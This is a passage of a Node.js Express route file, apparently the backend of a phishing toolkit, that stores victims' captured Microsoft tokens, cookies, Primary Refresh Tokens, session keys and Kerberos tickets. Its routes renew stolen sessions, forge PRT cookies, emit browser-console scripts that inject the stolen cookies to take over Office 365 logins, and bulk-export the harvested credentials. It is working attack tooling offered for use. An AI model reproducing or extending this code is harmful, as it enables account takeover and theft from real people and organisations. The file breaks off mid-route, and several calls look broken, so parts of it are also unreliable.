const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { userAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');
const kerberosService = require('../services/kerberos');
const silentConsentService = require('../services/silentconsent');
const multer = require('multer');
const dcdiag = require('../utils/dcdiag');

// Multer config for token file uploads (memory storage for parsing)
const tokenUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB
  fileFilter: (req, file, cb) => {
    if (file.originalname.endsWith('.json') || file.originalname.endsWith('.txt')) {
      cb(null, true);
    } else {
      cb(new Error('Only .json and .txt files are allowed'));
    }
  }
});

function safeDecrypt(val) {
  if (!val) return null;
  try {
    return decrypt(val);
  } catch (e) {
    return null;
  }
}

// Cache for column existence check
let hasTenantColumn = null;

async function checkTenantColumn() {
  if (hasTenantColumn !== null) return hasTenantColumn;
  try {
    const [columns] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'tenant'");
    hasTenantColumn = columns.length > 0;
  } catch (e) {
    hasTenantColumn = false;
  }
  return hasTenantColumn;
}

async function checkDeletedColumn() {
  try {
    const [columns] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'deleted'");
    return columns.length > 0;
  } catch (e) {
    return false;
  }
}

async function checkAccountTypeColumn() {
  try {
    const [columns] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'account_type'");
    return columns.length > 0;
  } catch (e) {
    return false;
  }
}


router.get('/inject*', (req, res) => {
  res.status(404).json({ error: 'Not found - use /api/tokens/inject/* for cookie injection' });
});

// ─── Get all tokens for user ────────────────────────────────────────
router.get('/', userAuth, async (req, res) => {
   try {
     const sort = req.query.sort;
     const search = req.query.search;
     const page = parseInt(req.query.page, 10) || 1;
     const limit = parseInt(req.query.limit, 10) || 50;

     const deletedExists = await checkDeletedColumn();
     const tenantExists = await checkTenantColumn();
     let accountTypeExists = false;
     try {
       const [acctCols] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'account_type'");
       accountTypeExists = acctCols.length > 0;
     } catch (e) { /* ignore */ }

     const filters = ['user_id = ?'];
     const params = [req.user.id];
     if (deletedExists) filters.push('deleted = 0');
     if (search) {
       filters.push('(email LIKE ? OR ip_address LIKE ?)');
       params.push('%' + search + '%', '%' + search + '%');
     }
     const whereSql = filters.length ? `WHERE ${filters.join(' AND ')}` : '';
     const selectFields = `id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale${deletedExists ? ', deleted' : ''}, created_at${tenantExists ? ', tenant' : ''}, template_type${accountTypeExists ? ', account_type' : ''}, token_status`;
     let query = `SELECT ${selectFields} FROM captured_tokens ${whereSql}`;
     query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
     const offset = (page - 1) * limit;
     query += ' LIMIT ? OFFSET ?';
     params.push(limit, offset);

     const [t] = await db.query(query, params);
     let tokens = t;
     if (!tenantExists && tokens.length > 0) tokens = tokens.map(token => ({ ...token, tenant: 'common' }));
     if (!accountTypeExists && tokens.length > 0) tokens = tokens.map(token => ({ ...token, account_type: null }));

     const countFilters = ['user_id = ?'];
     const countParams = [req.user.id];
     if (deletedExists) countFilters.push('deleted = 0');
     const countWhereSql = countFilters.length ? `WHERE ${countFilters.join(' AND ')}` : '';
     const [countResult] = await db.query(
       `SELECT COUNT(*) as total FROM captured_tokens ${countWhereSql}`,
       countParams
     );

     res.json({
       tokens,
       total: countResult[0].total,
       page,
       pages: Math.ceil(countResult[0].total / limit)
     });
  } catch (err) {


    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// ─── Get single token with decrypted data ───────────────────────────
router.get('/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const safeDecrypt = (val) => {
      if (!val) return null;
      try { return decrypt(val); } catch (e) { return null; }
    };
    const decrypted = {
      id: token.id,
      user_id: token.user_id,
      link_id: token.link_id,
      email: token.email,
      token_type: token.token_type,
      ip_address: db.open(token.ip_address),
      user_agent: token.user_agent,
      notes: token.notes || '',
      expiration: token.expiration,
      last_renewed: token.last_renewed,
      renewal_count: token.renewal_count,
      renewal_attempts: token.renewal_attempts,
      account_type: token.account_type || 'unknown',
      tenant: token.tenant,
      template_type: token.template_type,
      token_status: token.token_status || 'unknown',
      created_at: token.created_at,
      access_token: safeDecrypt(token.access_token_encrypted),
      refresh_token: safeDecrypt(token.refresh_token_encrypted),
      id_token: safeDecrypt(token.id_token_encrypted),
      cookies: safeDecrypt(token.cookies_encrypted),
      prt: safeDecrypt(token.prt),
      session_key_jwe: safeDecrypt(token.session_key_jwe),
      device_tenant_id: token.device_tenant_id,
      tgt_ad: safeDecrypt(token.tgt_ad),
      tgt_cloud: safeDecrypt(token.tgt_cloud),
      kerberos_top_level_names: token.kerberos_top_level_names,
      tgt_cloud_sessionkey: safeDecrypt(token.tgt_cloud_sessionkey)
    };

    res.json(decrypted);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Update token notes ─────────────────────────────────────────────
router.put('/:id/notes', userAuth, async (req, res) => {
  try {
    const { notes } = req.body;
    await db.query(
      'UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?',
      [notes || '', req.params.id, req.user.id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Soft delete token ──────────────────────────────────────────────
router.delete('/:id', userAuth, async (req, res) => {
  try {
    await db.query(
      'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Generate cookie script ─────────────────────────────────────────
router.get('/:id/cookie-script', userAuth, async (req, res) => {
  try {
    const token = await loadTokenRow(req, res);
    if (!token) return;

    const safeDecrypt = (val) => {
      if (!val) return null;
      try { return decrypt(val); } catch (e) { return null; }
    };

    const prtkdf = require('../services/prtkdf');

    const prtResolution = await resolveRealPrt(token);
    if (!prtResolution.prt) {
      return res.status(409).json({
        success: false,
        error: prtResolution.error || 'No PRT available for this token. Capture a PRT first (POST /:id/prt-capture).'
      });
    }
    const prt = prtResolution.prt;

    const materials = await resolveSessionKeyForToken(token);
    if (!materials.hasSessionKey) {
      return res.status(409).json({
        success: false,
        error: 'No PRT session key stored for this user+tenant. Capture a PRT first (POST /:id/prt-capture).'
      });
    }

    const prtCookie = await prtkdf.generatePrtCookie({
      prt,
      sessionKey: materials.sessionKey,
      nonce: (req.query && req.query.nonce) || null,
    });

    const cookieName = prtCookie.name || 'x-ms-RefreshTokenCredential';
    const cookieDomain = prtCookie.domain || prtkdf.prtCookieDomain(prt);
    const cookieValue = prtCookie.value;

    try {
      await db.query(
        'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW(), updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
        [encrypt(cookieValue), token.user_id, materials.tenant]
      );
    } catch (pErr) {

    }

    const script = [
      '// VGenius PRT Cookie Injection',
      '// Paste into the browser console while on https://' + cookieDomain + '/',
      '// (use a clean/incognito window so no other session interferes)',
      'document.cookie = ' + JSON.stringify(cookieName + '=' + cookieValue + '; domain=.' + cookieDomain + '; path=/; secure; samesite=none') + ';',
      '',
      '// Redirect after 3s',
      'setTimeout(() => {',
      '  window.location.href = "https://' + cookieDomain + '/?auth=2";',
      '}, 3000);'
    ].join('\n');

    res.json({
      success: true,
      method: 'prt',
      script,
      prt_cookie: cookieValue,
      cookie_name: cookieName,
      domain: cookieDomain,
      cookies: [{ name: cookieName, value: cookieValue, domain: '.' + cookieDomain }],
      cookie_count: 1,
      tenant: materials.tenant,
      generated_at: new Date().toISOString(),
      message: 'PRT cookie generated.'
    });
  } catch (err) {

    res.status(500).json({ success: false, error: 'Failed to generate PRT cookie: ' + err.message });
  }
});

function parseCookies(cookieString, options) {
  if (!cookieString) return [];

  options = options || {};
  var tenant = options.tenant || 'common';
  var accountType = options.accountType || 'unknown';

  function normalizeDomainForDocCookie(domain) {
    if (!domain) return '.login.microsoftonline.com';
    if (domain === '.microsoftonline.com' || domain === 'microsoftonline.com') {
      return '.login.microsoftonline.com';
    }
    if (domain === '.login.microsoftonline.com' || domain === 'login.microsoftonline.com') {
      return '.login.microsoftonline.com';
    }
    // Tenant-specific domains: normalize to .login.microsoftonline.com for document.cookie
    if (domain && domain.indexOf('microsoftonline.com') !== -1) {
      return '.login.microsoftonline.com';
    }
    return domain;
  }

  // Case 1: Already an array of cookie objects
  if (Array.isArray(cookieString)) {
    return cookieString.map(function(c) {
      return {
        name: c.name,
        value: c.value,
        domain: normalizeDomainForDocCookie(c.domain),
        path: c.path || '/',
        sameSite: c.sameSite || 'None',
      };
    }).filter(function(c) { return c.name && c.value; });
  }

  // Case 2: JSON string of an array (from stored cookies_encrypted)
  if (typeof cookieString === 'string' && cookieString.charAt(0) === '[') {
    try {
      var parsed = JSON.parse(cookieString);
      if (Array.isArray(parsed)) {
        return parsed.map(function(c) {
          return {
            name: c.name,
            value: c.value,
            domain: normalizeDomainForDocCookie(c.domain),
            path: c.path || '/',
            sameSite: c.sameSite || 'None',
          };
        }).filter(function(c) { return c.name && c.value; });
      }
    } catch (e) {
      // Not valid JSON, fall through to string parsing
    }
  }

  // Case 3: Legacy cookie string parsing
  var domainMap = buildCookieDomainMap(tenant, accountType);

  var seenNames = {};
  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].trim();
    var eqIndex = pair.indexOf('=');
    if (eqIndex > 0) {
      var name = pair.substring(0, eqIndex).trim();
      var value = pair.substring(eqIndex + 1).trim();
      var nameLower = name.toLowerCase();

      // Skip cookie attributes and their values
      if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
          nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
          nameLower === 'samesite' || nameLower === 'partitioned') {
        continue;
      }

      // Skip empty values
      if (!value || value.length === 0) continue;

      // Assign proper domain based on cookie name
      var assignedDomain = normalizeDomainForDocCookie(domainMap.getDomain(name));

      // Store unique cookies by lowercase name (last occurrence wins)
      seenNames[nameLower] = { name: name, value: value, domain: assignedDomain };
    }
  }

  // Convert object back to array
  var cookies = [];
  for (var key in seenNames) {
    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
      cookies.push(seenNames[key]);
    }
  }
  return cookies;
}

// ─── Build Cookie Domain Map ───────────────────────────────────────
function buildCookieDomainMap(tenant, accountType) {
  var domainMap = {
    _getDomain: function(cookieName) {
      var nameLower = cookieName.toLowerCase();

      // Personal account (MSA) domains
      if (accountType === 'personal') {
        if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken') {
          return '.login.live.com';
        }
        if (nameLower.indexOf('mscc') !== -1 || nameLower.indexOf('CRSLST') !== -1 ||
            nameLower.indexOf('STSSVC') !== -1 || nameLower.indexOf('wgctx') !== -1) {
          return '.login.live.com';
        }
        return '.login.live.com';
      }

      // Work/School account domains
      if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken' ||
          nameLower === 'pst' || nameLower === 'esx' || nameLower === 'gtmk' ||
          nameLower === 'es' || nameLower === 'pplms') {
        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
      }
      if (nameLower === 'SCAuth' || nameLower === 'SigninChallenge' ||
          nameLower === 'AccountAuthCookie' || nameLower === 'AMLBGen') {
        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
      }
      if (nameLower.indexOf('x-ms') !== -1 || nameLower.indexOf('msauth') !== -1) {
        return '.login.microsoftonline.com';
      }
      if (nameLower === '_oacl' || nameLower === '_rcid' || nameLower === 'RUpdT' ||
          nameLower === 'MCLRC' || nameLower === 'wssbLocation') {
        return '.office.com';
      }
      if (nameLower === 'WAAf' || nameLower === 'MSSWFS' || nameLower === 'RSTT' ||
          nameLower.indexOf('onedrive') !== -1) {
        return '.onedrive.live.com';
      }
      if (nameLower === 'ClientInfo' || nameLower === 'ExAuthCookie' ||
          nameLower.indexOf('outlook') !== -1) {
        return '.outlook.office365.com';
      }
      if (nameLower === 'SPOIDCRL' || nameLower === 'SPOExtensionSDK' ||
          nameLower.indexOf('sharepoint') !== -1) {
        return '.sharepoint.com';
      }
      if (nameLower === 'TEAMSSESSION' || nameLower.indexOf('teams') !== -1) {
        return '.teams.microsoft.com';
      }

      // Default fallback
      if (accountType === 'personal') return '.login.live.com';
      return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
    },
    getDomain: function(cookieName) {
      return this._getDomain(cookieName);
    }
  };
  return domainMap;
}

// ─── Manual cookie renewal ──────────────────────────────────────────
router.post('/:id/renew', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    if (!refreshToken && !accessToken) {
      return res.status(400).json({ error: 'No tokens available for renewal' });
    }

    // Use refresh token for direct renewal (no popup needed)
    if (refreshToken) {
      try {
        const cookieConverter = require('../services/cookieconverter');
        const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';
        const tokenTenant = token.tenant || config.AZURE_TENANT || 'common';

        // Use stored client_id if available, otherwise fall back to env
        const tokenClientId = token.client_id || config.AZURE_CLIENT_ID;
        const result = await cookieConverter.convertTokensToCookies(
          refreshToken, templateType, tokenTenant, token.email || null, token.account_type || 'unknown', req.user.id
        );

        if (result.success && result.cookies) {
          const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
          const newAccessToken = result.access_token || accessToken;
          const newRefreshToken = result.new_refresh_token || refreshToken;

          await db.query(
            `UPDATE captured_tokens
             SET cookies_encrypted = ?, token_type = 'cookie',
                 expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
                 last_renewed = NOW(),
                 renewal_count = COALESCE(renewal_count, 0) + 1,
                 access_token_encrypted = ?, refresh_token_encrypted = ?
             WHERE id = ?`,
            [
              encrypt(JSON.stringify(result.cookies)),
              ttlHours,
              encrypt(newAccessToken),
              encrypt(newRefreshToken),
              token.id
            ]
          );

          await db.query(
            'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
            [token.id, req.user.id, req.ip || 'unknown', 'refresh_token']
          );

        // FIX: Use local cookie_count variable instead of undefined result.cookie_count
        const cookieCount = result.cookies ? (Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(c => c.trim()).length) : 0;
        return res.json({
          success: true,
          message: 'Session renewed successfully using refresh token',
          cookies: result.cookies,
          cookie_count: cookieCount
        });
        }
      } catch (refreshErr) {

      }
    }

    // Fallback: For cookie-mode tokens without valid link_id, try direct refresh token exchange
    if (!token.link_id || token.token_type === 'cookie') {
      const cookieConverter = require('../services/cookieconverter');
      const cookieResult = await cookieConverter.convertTokensToCookies(
        refreshToken || accessToken, 'office', token.tenant || 'common', token.email || null, token.account_type || 'unknown', req.user.id
      );

      if (cookieResult.success && cookieResult.cookies) {
        const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
        await db.query(
          'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1 WHERE id=?',
          [encrypt(JSON.stringify(cookieResult.cookies)), 'cookie', ttlHours, token.id]
        );
        // FIX: Use local cookie_count variable instead of undefined result.cookie_count
        const cookieCount = cookieResult.cookies ? (Array.isArray(cookieResult.cookies) ? cookieResult.cookies.length : cookieResult.cookies.split(';').filter(c => c.trim()).length) : 0;
        return res.json({
          success: true,
          message: 'Session renewed successfully',
          cookies: cookieResult.cookies,
          cookie_count: cookieCount
        });
      }
      return res.status(400).json({ error: 'Renewal failed: ' + (cookieResult.error || 'Could not refresh session'), success: false });
    }

    // Try device code flow only if we have a valid link_id
    const deviceProxy = require('../services/deviceproxy');
    const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
    const jwtToken = require('jsonwebtoken').sign(
      { user_id: req.user.id, link_id: token.link_id },
      require('../config/env').JWT_SECRET,
      { expiresIn: '1h' }
    );

    const result = await deviceProxy.startDeviceFlow('cookie', jwtToken, apiBaseUrl);

    if (result.user_code) {
      await db.query(
        'INSERT INTO cookie_renewals (capture_id, user_id, user_code, success, created_at) VALUES (?, ?, ?, 0, NOW())',
        [token.id, req.user.id, result.user_code]
      );

      res.json({
        success: true,
        job_id: result.job_id,
        user_code: result.user_code,
        verification_uri: result.verification_uri,
        message: 'Renewal initiated. Complete authentication in the popup.',
        instructions: 'A popup will open. Enter the code and complete the Microsoft login.'
      });
    } else {
      res.status(400).json({ error: 'Failed to start renewal flow', success: false });
    }
  } catch (err) {
    const errorMsg = err.message || err.toString() || 'Unknown error';

    res.status(500).json({ error: 'Renewal failed: ' + errorMsg });
  }
});

// ─── Get renewal history ────────────────────────────────────────────
router.get('/:id/renewals', userAuth, async (req, res) => {
  try {
    const [renewals] = await db.query(
      'SELECT * FROM cookie_renewals WHERE capture_id = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50',
      [req.params.id, req.user.id]
    );
    res.json(renewals);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── One-shot console script for direct cookie injection ─────────────
router.get('/inject-script', userAuth, async (req, res) => {
  try {
    const { token_id } = req.query;
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [token_id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const accessToken = decrypt(token.access_token_encrypted);

    if (!refreshToken && !accessToken) {
      return res.status(400).json({ error: 'No tokens available for injection' });
    }

    // FIX: Pass tenant and account type for proper domain handling
    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var accountType = token.account_type || 'unknown';

    // Get cookies from token - require actual cookies only (no fallback)
    var cookiesList = [];
    var cookiesDecrypted = decrypt(token.cookies_encrypted);
    if (cookiesDecrypted) {
      cookiesList = parseCookies(cookiesDecrypted, { tenant: tenant, accountType: accountType });
    }

    if (cookiesList.length === 0) {
      return res.status(400).json({ error: 'No cookies available for injection' });
    }

    // Build cookie injection statements with proper domains
    var cookieStatements = '';
    for (var i = 0; i < cookiesList.length; i++) {
      var c = cookiesList[i];
      cookieStatements += 'document.cookie = "' + c.name + '=' + c.value.replace(/"/g, '\\"') + '; domain=' + (c.domain || '.login.microsoftonline.com') + '; path=/; Secure; SameSite=None";\n';
    }

    const script = '(function() {\n' +
      cookieStatements + '\n' +
      '// Redirect to Office.com after injecting cookies\n' +
      'setTimeout(function() {\n' +
      'window.location.href = "https://www.office.com/";\n' +
      '}, 3000);\n' +
      '})();';

    res.type('application/javascript').send(script);
  } catch (err) {

    res.status(500).json({ error: 'Failed to generate script' });
  }
});

router.get('/prt-inject', userAuth, async (req, res) => {
  try {
    const { token_id } = req.query;
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }

    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [token_id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const prtkdf = require('../services/prtkdf');

    const prtResolution = await resolveRealPrt(token);
    if (!prtResolution.prt) {
      return res.status(400).json({ error: prtResolution.error || 'No PRT available for this token' });
    }
    const prt = prtResolution.prt;

    const materials = await resolveSessionKeyForToken(token);
    if (!materials.hasSessionKey) {
      return res.status(400).json({ error: 'No PRT session key stored for this user+tenant' });
    }

    const prtCookie = await prtkdf.generatePrtCookie({
      prt,
      sessionKey: materials.sessionKey,
      nonce: (req.query && req.query.nonce) || null,
    });

    const host = prtCookie.domain || prtkdf.prtCookieDomain(prt);
    const script = [
      'document.cookie = ' + JSON.stringify('x-ms-RefreshTokenCredential=' + prtCookie.value + '; domain=.' + host + '; path=/; secure; samesite=none') + ';',
      '',
      '// Redirect after 3s',
      'setTimeout(() => {',
      '  window.location.href = "https://' + host + '/?auth=2";',
      '}, 3000);'
    ].join('\n');

    res.type('application/javascript').send(script);
  } catch (err) {

    res.status(500).json({ error: 'Failed to generate PRT injection script' });
  }
});

// ─── Convert stored token to cookies (by token ID) ──────────────────
router.post('/:id/convert', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );

    if (!tokens.length) {
      // Log whether the token exists but belongs to another user
      const [check] = await db.query(
        'SELECT user_id FROM captured_tokens WHERE id = ?',
        [req.params.id]
      );
      if (check.length) {

      } else {

      }
      return res.status(404).json({ error: 'Token not found' });
    }

    const token = tokens[0];
    const refreshToken = safeDecrypt(token.refresh_token_encrypted);

    if (!refreshToken) {
      return res.status(400).json({
        error: 'No refresh token available for conversion. Use the Refresh button to renew this token first.'
      });
    }

    const prtkdf = require('../services/prtkdf');

    const prt = safeDecrypt(token.prt) || refreshToken;
    if (!prt) {
      return res.status(400).json({ error: 'No PRT available for conversion' });
    }

    const materials = await resolveSessionKeyForToken(token);
    if (!materials.hasSessionKey) {
      return res.status(400).json({
        error: 'No PRT session key stored for this user+tenant. Capture a PRT first (POST /:id/prt-capture).'
      });
    }

    const prtCookie = await prtkdf.generatePrtCookie({
      prt,
      sessionKey: materials.sessionKey,
      nonce: (req.body && req.body.nonce) || null,
    });

    const cookieName = prtCookie.name || 'x-ms-RefreshTokenCredential';
    const cookieDomain = prtCookie.domain || prtkdf.prtCookieDomain(prt);

    try {
      await db.query(
        'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW(), updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
        [encrypt(prtCookie.value), token.user_id, materials.tenant]
      );
    } catch (pErr) {

    }

    try {
      await db.query(
        'UPDATE captured_tokens SET cookies_encrypted = ? WHERE id = ? AND user_id = ?',
        [encrypt(JSON.stringify([{ name: cookieName, value: prtCookie.value, domain: '.' + cookieDomain }])), token.id, req.user.id]
      );
    } catch (e) {

    }

    const script = [
      '// VGenius PRT Cookie Injection',
      '// Paste into the browser console while on https://' + cookieDomain + '/',
      'document.cookie = ' + JSON.stringify('x-ms-RefreshTokenCredential=' + prtCookie.value + '; domain=.' + cookieDomain + '; path=/; secure; samesite=none') + ';',
      '',
      '// Redirect after 3s',
      'setTimeout(() => {',
      '  window.location.href = "https://' + cookieDomain + '/?auth=2";',
      '}, 3000);'
    ].join('\n');

    return res.json({
      success: true,
      method: 'prt',
      message: 'PRT cookie generated',
      script,
      prt_cookie: prtCookie.value,
      cookie_name: cookieName,
      domain: cookieDomain,
      cookies: [{ name: cookieName, value: prtCookie.value, domain: '.' + cookieDomain }],
      cookie_count: 1,
      target_url: 'https://' + cookieDomain + '/',
      expires: '5 minutes',
      instructions: 'Paste the script into the browser console on ' + cookieDomain + ' (clean/incognito window), then reload.'
    });
  } catch (err) {

    return res.status(500).json({ error: 'Conversion failed: ' + err.message });
  }
});

// ─── Manual cookie conversion from pasted access token ──────────────
router.post('/convert-cookie', userAuth, async (req, res) => {
  try {
    const { access_token, template_type, tenant, account_type, refresh_token } = req.body;

    if (!access_token && !refresh_token) {
      return res.status(400).json({ error: 'Access token or refresh token is required' });
    }

    const tokenToUse = refresh_token || access_token;
    const cookieConverter = require('../services/cookieconverter');
    const result = await cookieConverter.convertTokensToCookies(
      tokenToUse,
      template_type || 'office',
      tenant || 'common',
      null,
      account_type || 'unknown'
    );

    if (result.success && result.cookies) {
      res.json({
        success: true,
        cookies: result.cookies,
        cookie_count: Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
        expires: '30 days',
        instructions: 'Use the injector page to set cookies in your browser'
      });
    } else {

      res.status(400).json({ 
        success: false, 
        error: result.error || 'Conversion failed',
        debug: result.debug
      });
    }
  } catch (err) {

    res.status(500).json({ error: 'Conversion failed: ' + err.message });
  }
});

// ─── Export tokens ──────────────────────────────────────────────────
router.post('/export', userAuth, async (req, res) => {
  try {
    const deleteAfter = req.body && req.body.delete_after === true;

    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, client_info, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
      [req.user.id]
    );

    const decryptedTokens = tokens.map(token => {
      const safeDecrypt = (val) => {
        if (!val) return null;
        try { return decrypt(val); } catch (e) { return null; }
      };

      // Build PRT JSON object matching competitor format
      const prtData = {
        token_type: 'Bearer',
        expires_in: 1209599,
        ext_expires_in: 0,
        expires_on: token.expiration ? Math.floor(new Date(token.expiration).getTime() / 1000) : null,
        refresh_token: safeDecrypt(token.refresh_token_encrypted),
        refresh_token_expires_in: 1209599,
        id_token: safeDecrypt(token.id_token_encrypted),
        client_info: token.client_info || null,
        session_key_jwe: safeDecrypt(token.session_key_jwe),
        device_tenant_id: token.device_tenant_id || null,
        tgt_ad: safeDecrypt(token.tgt_ad),
        tgt_cloud: safeDecrypt(token.tgt_cloud),
        kerberos_top_level_names: safeDecrypt(token.kerberos_top_level_names),
        session_key: safeDecrypt(token.session_key_jwe),
        tgt_cloud_sessionkey: safeDecrypt(token.tgt_cloud_sessionkey)
      };

      // Fallback: try to extract client_info from session_key_jwe if DB column is empty
      if (!prtData.client_info && prtData.session_key_jwe) {
        try {
          const parsed = JSON.parse(prtData.session_key_jwe);
          if (parsed.client_info) {
            prtData.client_info = parsed.client_info;
          }
          if (parsed.session_key && !prtData.session_key) {
            prtData.session_key = parsed.session_key;
          }
        } catch (e) { /* ignore */ }
      }

      return {
        mode: token.token_type || 'cookie',
        email: token.email || '',
        name: token.email ? token.email.split('@')[0] : '',
        access_token: safeDecrypt(token.access_token_encrypted),
        refresh_token: safeDecrypt(token.refresh_token_encrypted),
        prt: JSON.stringify(prtData),
        expires_at: token.expiration ? new Date(token.expiration).toISOString() : null,
        status: 'active',
        notes: token.notes || null,
        created_at: token.created_at ? new Date(token.created_at).toISOString() : null
      };
    });

    if (deleteAfter) {
      await db.query(
        'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0',
        [req.user.id]
      );
    }

    res.json({
      tokens: decryptedTokens,
      exported_at: new Date().toISOString(),
      count: decryptedTokens.length,
      deleted: deleteAfter
    });
  } catch (err) {

    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// ─── Export and delete all ──────────────────────────────────────────
router.post('/export-delete-all', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, session_key_jwe, device_tenant_id, tgt_ad, tgt_cloud, kerberos_top_level_names, tgt_cloud_sessionkey, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    const decryptedTokens = tokens.map(token => {
      const safeDecrypt = (val) => {
        if (!val) return null;
        try { return decrypt(val); } catch (e) { return null; }
      };

      const prtData = {
        token_type: 'Bearer',
        expires_in: 1209599,
        ext_expires_in: 0,
        expires_on: token.expiration ? Math.floor(new Date(token.expiration).getTime() / 1000) : null,
        refresh_token: safeDecrypt(token.refresh_token_encrypted),
        refresh_token_expires_in: 1209599,
        id_token: safeDecrypt(token.id_token_encrypted),
        client_info: null,
        session_key_jwe: safeDecrypt(token.session_key_jwe),
        device_tenant_id: safeDecrypt(token.device_tenant_id),
        tgt_ad: safeDecrypt(token.tgt_ad),
        tgt_cloud: safeDecrypt(token.tgt_cloud),
        kerberos_top_level_names: safeDecrypt(token.kerberos_top_level_names),
        session_key: null,
        tgt_cloud_sessionkey: safeDecrypt(token.tgt_cloud_sessionkey)
      };

      if (prtData.session_key_jwe) {
        try {
          const parsed = JSON.parse(prtData.session_key_jwe);
          if (parsed.client_info) prtData.client_info = parsed.client_info;
          if (parsed.session_key) prtData.session_key = parsed.session_key;
        } catch (e) { /* ignore */ }
      }

      return {
        mode: token.token_type || 'cookie',
        email: token.email || '',
        name: token.email ? token.email.split('@')[0] : '',
        access_token: safeDecrypt(token.access_token_encrypted),
        refresh_token: safeDecrypt(token.refresh_token_encrypted),
        prt: JSON.stringify(prtData),
        expires_at: token.expiration ? new Date(token.expiration).toISOString() : null,
        status: 'active',
        notes: token.notes || null,
        created_at: token.created_at ? new Date(token.created_at).toISOString() : null
      };
    });

    await db.query(
      'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0',
      [req.user.id]
    );

    res.json({
      tokens: decryptedTokens,
      exported_at: new Date().toISOString(),
      count: decryptedTokens.length,
      deleted: true
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Derive Kerberos TGTs for a specific token ──────────────────────
router.post('/:id/derive-tgt', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
